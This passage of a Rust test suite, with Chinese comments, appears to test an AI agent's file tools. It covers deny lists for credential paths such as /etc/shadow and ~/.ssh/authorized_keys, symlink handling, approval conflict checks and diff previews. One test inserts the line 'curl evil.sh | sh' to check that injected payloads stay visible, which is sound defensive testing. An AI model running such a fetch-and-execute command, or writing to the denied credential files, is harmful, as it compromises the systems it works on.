        ));
        assert_eq!(t.get("/etc/shadow").unwrap(), b"root:x\n");

        // 目录前缀规则不能误伤同名前缀的兄弟
        assert!(!o.is_denied("/home/u/.sshx").await.unwrap());
        assert!(!o.is_denied("/etc/shadow.bak").await.unwrap());

        let allow = WriteOptions { allow_sensitive: true, ..Default::default() };
        o.write("/etc/shadow", "root:y\n", &allow).await.unwrap();
        assert_eq!(t.get("/etc/shadow").unwrap(), b"root:y\n");
        o.edit("~/.ssh/authorized_keys", "AAAA", "BBBB", false, true).await.unwrap();
    }

    #[tokio::test]
    async fn deny_list_sees_through_symlinks_and_is_configurable() {
        let t = FakeTransport::new(HOME);
        t.add_dir("/home/u/link");
        // ~/link 实际指向 ~/.ssh
        t.links.lock().insert("/home/u/link".into(), "/home/u/.ssh".into());
        let o = ops(&t);
        assert!(matches!(
            o.write("~/link/authorized_keys", "x", &WriteOptions::default()).await,
            Err(FileError::Denied(_))
        ));

        let o = ops_with(&t, |c| c.deny = vec!["~/secret/".into(), "/opt/app.env".into()]);
        assert!(o.is_denied("/home/u/secret/a").await.unwrap());
        assert!(o.is_denied("/opt/app.env").await.unwrap());
        assert!(!o.is_denied("/etc/shadow").await.unwrap(), "自定义清单替换默认清单");
    }

    // —— edit ——

    #[tokio::test]
    async fn edit_requires_unique_match_unless_replace_all() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/e.txt", b"foo = 1\nbar = 2\nfoo = 3\n");
        let o = ops(&t);

        let err = o.edit("~/e.txt", "foo", "baz", false, false).await.unwrap_err();
        assert!(matches!(err, FileError::Edit(ref m) if m.contains("2 次")), "{err}");
        assert_eq!(t.get("/home/u/e.txt").unwrap(), b"foo = 1\nbar = 2\nfoo = 3\n", "失败不能落盘");

        let ch = o.edit("~/e.txt", "foo = 3", "foo = 30", false, false).await.unwrap();
        assert_eq!(ch.replacements, 1);
        assert_eq!(t.get("/home/u/e.txt").unwrap(), b"foo = 1\nbar = 2\nfoo = 30\n");
        assert!(ch.diff_preview.contains("-foo = 3\n+foo = 30"), "{}", ch.diff_preview);

        let ch = o.edit("~/e.txt", "foo", "qux", true, false).await.unwrap();
        assert_eq!(ch.replacements, 2);
        assert_eq!(t.get("/home/u/e.txt").unwrap(), b"qux = 1\nbar = 2\nqux = 30\n");
    }

    #[tokio::test]
    async fn edit_not_found_and_bad_args() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/e.txt", b"  indented\n");
        t.add_file("/home/u/bad", b"\xff\xfe x\n");
        let o = ops(&t);
        let err = o.edit("~/e.txt", "indented ", "x", false, false).await.unwrap_err();
        assert!(matches!(err, FileError::Edit(ref m) if m.contains("没找到")), "{err}");
        assert!(matches!(o.edit("~/e.txt", "", "x", false, false).await, Err(FileError::InvalidArg(_))));
        assert!(matches!(o.edit("~/e.txt", "a", "a", false, false).await, Err(FileError::InvalidArg(_))));
        assert!(matches!(o.edit("~/none", "a", "b", false, false).await, Err(FileError::NotFound(_))));
        assert!(matches!(o.edit("~/bad", "x", "y", false, false).await, Err(FileError::Edit(_))));
    }

    #[tokio::test]
    async fn edit_matches_lf_old_string_in_crlf_file() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/w.ini", b"[a]\r\nk=1\r\n[b]\r\n");
        let o = ops(&t);
        o.edit("~/w.ini", "[a]\nk=1", "[a]\nk=2\nz=3", false, false).await.unwrap();
        assert_eq!(t.get("/home/u/w.ini").unwrap(), b"[a]\r\nk=2\r\nz=3\r\n[b]\r\n", "保持 CRLF");
    }

    #[tokio::test]
    async fn edit_result_cap_and_file_cap() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/s", b"aaaa");
        t.add_file("/home/u/huge", &vec![b'a'; 64]);
        let o = ops_with(&t, |c| c.write_cap = 32);
        assert!(matches!(
            o.edit("~/s", "a", "aaaaaaaaaa", true, false).await,
            Err(FileError::TooLarge { size: 40, .. })
        ));
        assert!(matches!(o.edit("~/huge", "a", "b", true, false).await, Err(FileError::TooLarge { .. })));
    }

    #[tokio::test]
    async fn commit_rejects_when_file_changed_after_preview() {
        let t = FakeTransport::new(HOME);
        t.add_file("/home/u/r", b"v1\n");
        let o = ops(&t);
        let pending = o.prepare_edit("~/r", "v1", "v2", false, false).await.unwrap();
        assert_eq!(t.get("/home/u/r").unwrap(), b"v1\n", "prepare 不落盘");
        t.add_file("/home/u/r", b"v1 changed by user\n");
        assert!(matches!(o.commit(&pending).await, Err(FileError::Conflict(_))));
        assert_eq!(t.get("/home/u/r").unwrap(), b"v1 changed by user\n");

        // 预览时不存在、审批期间被别人建了：同样拒绝
        let p = o.prepare_write("~/n", "mine", &WriteOptions::default()).await.unwrap();
        t.add_file("/home/u/n", b"theirs");
        assert!(matches!(o.commit(&p).await, Err(FileError::Conflict(_))));
    }

    // —— glob ——

    #[test]
    fn glob_regex_semantics() {
        let m = |p: &str, s: &str| glob_to_regex(p).unwrap().is_match(s);
        assert!(m("*.rs", "a.rs"));
        assert!(!m("*.rs", "src/a.rs"), "* 不跨目录");
        assert!(m("**/*.rs", "a.rs"), "**/ 可匹配零层");
        assert!(m("**/*.rs", "x/y/a.rs"));
        assert!(m("src/**", "src/a/b"));
        assert!(m("?.txt", "a.txt") && !m("?.txt", "ab.txt"));
        assert!(m("*.{yml,yaml}", "c.yaml") && m("*.{yml,yaml}", "c.yml") && !m("*.{yml,yaml}", "c.json"));
        assert!(m("[ab].c", "a.c") && !m("[!ab].c", "a.c") && m("[!ab].c", "z.c"));
        assert!(m("a+b(1).txt", "a+b(1).txt"), "正则元字符要转义");
        assert!(glob_to_regex("{a,b").is_err());
    }

    #[tokio::test]
    async fn glob_finds_files_sorted_by_mtime_with_caps() {
        let t = FakeTransport::new(HOME);
        t.add_file("/srv/app/a.conf", b"1");
        t.add_file("/srv/app/sub/b.conf", b"1");
        t.add_file("/srv/app/sub/deeper/c.conf", b"1");
        t.add_file("/srv/app/node_modules/x.conf", b"1");
        t.add_file("/srv/app/.git/config.conf", b"1");
        t.add_file("/srv/app/readme.md", b"1");
        t.set_mtime("/srv/app/a.conf", 1);
        t.set_mtime("/srv/app/sub/deeper/c.conf", 9_999);
        let o = ops(&t);

        let r = o.glob(Some("/srv/app"), "**/*.conf", 100).await.unwrap();
        assert_eq!(
            r.files,
            vec!["/srv/app/sub/deeper/c.conf", "/srv/app/sub/b.conf", "/srv/app/a.conf"],
            "跳过 node_modules/.git，按修改时间从新到旧"
        );
        assert!(!r.truncated);

        let top = o.glob(Some("/srv/app"), "*.conf", 100).await.unwrap();
        assert_eq!(top.files, vec!["/srv/app/a.conf"]);

        let abs = o.glob(None, "/srv/app/sub/*.conf", 100).await.unwrap();
        assert_eq!((abs.root.as_str(), abs.files.len()), ("/srv/app/sub", 1));

        let capped = o.glob(Some("/srv/app"), "**/*.conf", 2).await.unwrap();
        assert_eq!(capped.files.len(), 2);
        assert!(capped.truncated);

        let shallow = ops_with(&t, |c| c.walk.max_depth = 2);
        let r = shallow.glob(Some("/srv/app"), "**/*.conf", 100).await.unwrap();
        assert!(r.truncated, "深度上限截断要报告");
        assert!(!r.files.iter().any(|f| f.contains("deeper")));

        let few_dirs = ops_with(&t, |c| c.walk.max_dirs = 1);
        assert!(few_dirs.glob(Some("/srv/app"), "**/*.conf", 100).await.unwrap().truncated);

        assert!(matches!(o.glob(Some("/nope"), "*", 10).await, Err(FileError::NotFound(_))));
    }

    // —— grep ——

    #[tokio::test]
    async fn grep_matches_lines_and_respects_caps() {
        let t = FakeTransport::new(HOME);
        t.add_file("/srv/a.yaml", b"port: 80\nhost: x\nport: 443\n");
        t.add_file("/srv/sub/b.yaml", b"PORT: 8080\n");
        t.add_file("/srv/c.txt", b"port: 1\n");
        t.add_file("/srv/bin.dat", b"port\0\0");
        let o = ops(&t);

        let r = o.grep(Some("/srv"), r"^port:", Some("*.yaml"), false, 100).await.unwrap();
        let got: Vec<(String, usize)> = r.matches.iter().map(|m| (m.path.clone(), m.line)).collect();
        assert_eq!(got, vec![("/srv/a.yaml".into(), 1), ("/srv/a.yaml".into(), 3)]);
        assert!(!r.truncated);

        let ci = o.grep(Some("/srv"), r"^port:", Some("*.yaml"), true, 100).await.unwrap();
        assert_eq!(ci.matches.len(), 3);

        let all = o.grep(Some("/srv"), "port", None, false, 100).await.unwrap();
        assert!(all.matches.iter().all(|m| m.path != "/srv/bin.dat"), "二进制要跳过");

        let capped = o.grep(Some("/srv"), "port", None, true, 2).await.unwrap();
        assert_eq!(capped.matches.len(), 2);
        assert!(capped.truncated);

        let one = o.grep(Some("/srv/c.txt"), "port", None, false, 10).await.unwrap();
        assert_eq!((one.matches.len(), one.files_scanned), (1, 1));

        let few = ops_with(&t, |c| c.grep_max_files = 1);
        let r = few.grep(Some("/srv"), "zzz", None, false, 10).await.unwrap();
        assert!(r.truncated && r.files_scanned == 1);

        let small = ops_with(&t, |c| c.read_cap = 10);
        let r = small.grep(Some("/srv"), "port", None, false, 10).await.unwrap();
        assert!(r.matches.iter().all(|m| m.path != "/srv/a.yaml"), "超出读取上限的文件不扫");

        assert!(matches!(o.grep(Some("/srv"), "(", None, false, 10).await, Err(FileError::BadPattern(_))));
    }

    #[tokio::test]
    async fn grep_flags_secrets_and_truncates_long_lines() {
        let t = FakeTransport::new(HOME);
        let long = format!("needle {}\n", "y".repeat(1000));
        t.add_file("/d/long", long.as_bytes());
        t.add_file("/d/env", b"password=hunter2hunter2\n");
        let o = ops(&t);
        let r = o.grep(Some("/d/long"), "needle", None, false, 10).await.unwrap();
        assert!(r.matches[0].text.chars().count() <= GREP_LINE_CHARS + 1);
        let s = o.grep(Some("/d/env"), "password", None, false, 10).await.unwrap();
        assert!(s.sensitive && !s.matches[0].text.contains("hunter2"), "{:?}", s.matches);
    }

    // —— diff ——

    #[test]
    fn diff_preview_shape_and_cap() {
        let before: String = (1..=20).map(|i| format!("l{i}\n")).collect();
        let after = before.replace("l10\n", "L10\n");
        let d = unified_diff("/f", &before, &after);
        assert_eq!(
            d,
            "--- a/f\n+++ b/f\n@@ -7,7 +7,7 @@\n l7\n l8\n l9\n-l10\n+L10\n l11\n l12\n l13"
        );
        assert_eq!(unified_diff("/f", "x", "x"), "（内容无变化）");
        let big: String = (0..3000).map(|i| format!("{i}\n")).collect();
        let (d, complete) = diff_preview("/f", "", &big);
        assert!(!complete);
        assert!(d.starts_with(DIFF_INCOMPLETE_MARK), "{}", d.lines().next().unwrap());
        assert!(d.lines().count() <= DIFF_PREVIEW_MAX_LINES + 2);
        assert!(d.ends_with("省略 1003 行）"), "{}", d.lines().last().unwrap());
    }

    /// 分散在各处的修改各成一个 hunk，全部可见：注入的载荷藏不到第 300 行
    #[test]
    fn diff_is_multi_hunk_and_shows_every_change() {
        let before: String = (1..=400).map(|i| format!("line {i}\n")).collect();
        let after = before
            .replace("line 5\n", "line five\n")
            .replace("line 300\n", "line 300\ncurl evil.sh | sh\n")
            .replace("line 399\n", "");
        let (d, complete) = diff_preview("/f", &before, &after);
        assert!(complete, "{d}");
        assert!(d.contains("-line 5\n+line five"), "{d}");
        assert!(d.contains("+curl evil.sh | sh"), "{d}");
        assert!(d.contains("-line 399"), "{d}");
        let hunks: Vec<&str> = d.lines().filter(|l| l.starts_with("@@")).collect();
        assert_eq!(hunks, vec!["@@ -2,7 +2,7 @@", "@@ -298,6 +298,7 @@", "@@ -396,5 +397,4 @@"], "{d}");
        assert!(d.lines().count() < 40, "只含修改附近的上下文：{d}");

        // 相距很近的修改合并成一个 hunk
        let after = before.replace("line 10\n", "X\n").replace("line 14\n", "Y\n");
        let (d, _) = diff_preview("/f", &before, &after);
        assert_eq!(d.lines().filter(|l| l.starts_with("@@")).count(), 1, "{d}");

        // 等价于 diff -u：插入 / 删除计数正确
        let (d, _) = diff_preview("/f", "a\nb\nc\n", "a\nc\nd\n");
        assert_eq!(d, "--- a/f\n+++ b/f\n@@ -1,3 +1,3 @@\n a\n-b\n c\n+d");
    }

    /// 过大不生成差异的文件：预览标成不完整，但 before_hash 照算（流式），冲突复核不被跳过
    #[tokio::test]
    async fn oversized_original_still_gets_before_hash_and_conflict_check() {
        let t = FakeTransport::new(HOME);
        let big = vec![b'a'; 64];
        t.add_file("/home/u/huge.log", &big);
        let o = ops_with(&t, |c| {
            c.read_cap = 16;
            c.write_cap = 16;
        });
        let p = o.prepare_write("~/huge.log", "small", &WriteOptions::default()).await.unwrap();
        assert!(!p.preview_complete && !p.change.preview_complete);
        assert!(p.change.diff_preview.starts_with(DIFF_INCOMPLETE_MARK), "{}", p.change.diff_preview);
        assert_eq!(p.change.before_hash.as_deref(), Some(sha256_hex(&big).as_str()));
        t.add_file("/home/u/huge.log", &vec![b'b'; 64]);
        assert!(matches!(o.commit(&p).await, Err(FileError::Conflict(_))), "审批期间被改过要拒绝");

        // 二进制原文件同样不完整
        t.add_file("/home/u/bin", b"\0\x01\x02");
        let p = o.prepare_write("~/bin", "text", &WriteOptions::default()).await.unwrap();
        assert!(!p.preview_complete);
        // 普通小改动是完整的
        t.add_file("/home/u/s", b"a\n");
        assert!(o.prepare_write("~/s", "b\n", &WriteOptions::default()).await.unwrap().preview_complete);
    }

    /// 0600 的文件：临时文件创建时就是 0600（不经过全世界可读的一刻）
    #[tokio::test]
    async fn temp_file_is_born_with_original_mode() {
        let mut t = FakeTransport::new(HOME);
        t.posix_rename = true;
        t.add_file("/home/u/.env", b"A=1\n");
        t.set_permissions_for_test("/home/u/.env", 0o600);
        let o = ops(&t);
        o.write("~/.env", "A=2\n", &WriteOptions::default()).await.unwrap();
        let log = t.ops.lock().clone();
        assert!(log[0].starts_with("write /home/u/..env.nxtmp-") && log[0].ends_with(" mode 600"), "{log:?}");
        assert_eq!(t.mode("/home/u/.env").unwrap() & 0o777, 0o600);
    }

    /// 多个硬链接：原地重写（不原子），不把它从其它链接上拆开
    #[tokio::test]
    async fn hardlinked_target_is_rewritten_in_place() {
        let mut t = FakeTransport::new(HOME);
        t.posix_rename = true;
        t.add_file("/home/u/h", b"old\n");
        t.nlinks.lock().insert("/home/u/h".into(), 2);
        let o = ops(&t);
        let ch = o.write("~/h", "new\n", &WriteOptions::default()).await.unwrap();
        assert!(!ch.atomic);
        assert_eq!(t.get("/home/u/h").unwrap(), b"new\n");
        let log = t.ops.lock().clone();
        assert_eq!(log, vec!["write /home/u/h".to_string()], "没有临时文件和改名");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn local_replace_keeps_symlink_mode_and_hardlinks() {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let dir = TempDir::new();
        let t = LocalTransport::with_home(dir.path(""));
        let o = FileOps::new(&t, FileOpsConfig::default());

        // 符号链接：链接保留，内容写到它指向的文件
        let real = dir.path("real.conf");
        let link = dir.path("link.conf");
        std::fs::write(&real, "v1\n").unwrap();
        std::os::unix::fs::symlink(&real, &link).unwrap();
        let ch = o.write(&link, "v2\n", &WriteOptions::default()).await.unwrap();
        assert!(ch.atomic);
        assert!(std::fs::symlink_metadata(&link).unwrap().file_type().is_symlink(), "链接不能被换成普通文件");
        assert_eq!(std::fs::read_to_string(&real).unwrap(), "v2\n");

        // 0600：结果仍是 0600；临时文件在创建那一刻就是 0600
        let secret = dir.path("secret");
        std::fs::write(&secret, "s1\n").unwrap();
        std::fs::set_permissions(&secret, std::fs::Permissions::from_mode(0o600)).unwrap();
        o.write(&secret, "s2\n", &WriteOptions::default()).await.unwrap();
        assert_eq!(std::fs::metadata(&secret).unwrap().permissions().mode() & 0o777, 0o600);
        let tmp = dir.path(".probe.nxtmp-x");
        t.create_with_mode(&tmp, b"x", Some(0o600)).await.unwrap();
        assert_eq!(std::fs::metadata(&tmp).unwrap().permissions().mode() & 0o077, 0, "临时文件不能对组 / 其他人可读");
        assert!(t.create_with_mode(&tmp, b"y", Some(0o600)).await.is_err(), "临时文件必须是新建的，不跟随已存在的路径");

        // 硬链接：原地重写，两个名字仍是同一个 inode
        let h1 = dir.path("h1");
        let h2 = dir.path("h2");
        std::fs::write(&h1, "old\n").unwrap();
        std::fs::hard_link(&h1, &h2).unwrap();
        let ino = std::fs::metadata(&h1).unwrap().ino();
        let ch = o.write(&h1, "new\n", &WriteOptions::default()).await.unwrap();
        assert!(!ch.atomic, "硬链接走原地重写，要如实报告");
        assert_eq!(std::fs::metadata(&h1).unwrap().ino(), ino);
        assert_eq!(std::fs::read_to_string(&h2).unwrap(), "new\n");

        // 大文件的 before_hash：流式计算与整读一致
        assert_eq!(t.sha256(&h2).await.unwrap(), sha256_hex(b"new\n"));
    }

    // —— 工具声明 ——

    #[test]
    fn tool_specs_are_well_formed() {
        let specs = file_tool_specs();
        let names: Vec<_> = specs.iter().map(|s| s.name).collect();
        assert_eq!(names, vec![TOOL_READ, TOOL_WRITE, TOOL_EDIT, TOOL_GLOB, TOOL_GREP]);
        for s in &specs {
            assert_eq!(s.schema["type"], "object");
            for r in s.schema["required"].as_array().unwrap() {
                assert!(s.schema["properties"].get(r.as_str().unwrap()).is_some(), "{}: {r}", s.name);
            }
            assert!(
                s.schema["properties"].get("allowSensitive").is_none(),
                "越过禁写清单不能交给模型决定"
            );
        }
        // 参数结构能解析 schema 里的字段名
        let a: EditArgs = serde_json::from_value(serde_json::json!({
            "path": "~/x", "oldString": "a", "newString": "b", "replaceAll": true
        }))
        .unwrap();
        assert!(a.replace_all);
        let w: WriteArgs =
            serde_json::from_value(serde_json::json!({"path": "/x", "content": "c", "createDirs": true}))
                .unwrap();
        assert!(w.create_dirs);
    }

    // —— 本地 transport（真实临时目录）——

    #[tokio::test]
    async fn local_transport_end_to_end() {
        let dir = TempDir::new();
        let t = LocalTransport::with_home(dir.path(""));
        let o = FileOps::new(&t, FileOpsConfig::default());

        let opts = WriteOptions { create_dirs: true, ..Default::default() };
        let ch = o.write("~/sub/deep/a.txt", "one\ntwo\nthree\n", &opts).await.unwrap();
        assert!(ch.created && ch.atomic);
        let p = dir.path("sub/deep/a.txt");
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "one\ntwo\nthree\n");

        let r = o.read(&p, Some(2), Some(1)).await.unwrap();
        assert_eq!(r.content, "     2\ttwo\n");

        o.edit("~/sub/deep/a.txt", "two", "TWO", false, false).await.unwrap();
        assert_eq!(std::fs::read_to_string(&p).unwrap(), "one\nTWO\nthree\n");

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o750)).unwrap();
            let ch = o.write(&p, "x\n", &WriteOptions::default()).await.unwrap();
            assert!(ch.atomic, "本地 rename 原子覆盖");
            let m = std::fs::metadata(&p).unwrap().permissions().mode();
            assert_eq!(m & 0o777, 0o750, "原子替换后权限不变");
        }
        let leftovers: Vec<_> = std::fs::read_dir(dir.path("sub/deep"))
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(leftovers, vec!["a.txt"], "不留临时文件");

        std::fs::write(dir.path("sub/b.log"), "ERROR boom\nok\n").unwrap();
        let g = o.glob(Some("~"), "**/*.{txt,log}", 10).await.unwrap();
        assert_eq!(g.files.len(), 2);
        let m = o.grep(Some("~"), "ERROR", Some("*.log"), false, 10).await.unwrap();
        assert_eq!(m.matches.len(), 1);
        assert_eq!(m.matches[0].line, 1);

        // 禁写清单里的 ~ 按 transport 的家目录展开
        assert!(matches!(
            o.write("~/.ssh/authorized_keys", "k", &opts).await,
            Err(FileError::Denied(_))
        ));
        assert!(!std::path::Path::new(&dir.path(".ssh")).exists());
    }
}
